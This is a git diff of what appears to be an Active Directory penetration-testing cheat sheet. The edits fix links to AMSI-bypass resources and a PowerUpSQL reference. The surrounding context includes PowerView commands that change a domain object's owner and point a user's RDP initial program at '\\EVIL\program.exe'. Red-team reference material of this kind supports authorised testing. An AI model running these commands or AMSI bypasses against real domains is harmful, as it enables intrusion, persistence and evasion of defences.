@@ -50,7 +50,6 @@ permalink: /:categories/:title/
 ### <a name='RunningPowershellTools'></a>Running Powershell Tools
 
 - [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
-- [PowerUPsql CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
 
 #### <a name='SpawnanADaccount'></a>Spawn an AD account
 ```powershell
@@ -83,9 +82,9 @@ $ErrorActionPreference = 'Continue' # set back the display of the errors
 ```
 
 #### <a name='BypassAMSI'></a>Bypass AMSI 
-- [amsi.fails]('https://amsi.fails')
-- [S3cur3Th1sSh1t]('https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell')
-- [notes.offsec-journey.com]('https://notes.offsec-journey.com/evasion/amsi-bypass')
+- [amsi.fails](https://amsi.fails)
+- [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+- [notes.offsec-journey.com](https://notes.offsec-journey.com/evasion/amsi-bypass)
 
 ### <a name='RunningBloodhound'></a>Running Bloodhound 
 ```powershell
@@ -298,6 +297,7 @@ Find-InterestingDomainShareFile -Domain $dom -DomainController $dom_dc -Credenti
 ### <a name='TxxxMSSQLservers'></a>Txxx MSSQL servers
 
 References:
+- [PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
 - [https://attack.mitre.org/techniques/T1135](https://attack.mitre.org/techniques/T1135/)
 
 ```powershell
@@ -398,5 +398,4 @@ Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Ver
 
 # Set the owner of 'dfm' in the current domain to 'harmj0y'
 Set-DomainObjectOwner -Identity dfm -OwnerIdentity $user -Domain $dom -DomainController $dom_dc 
-
 ```
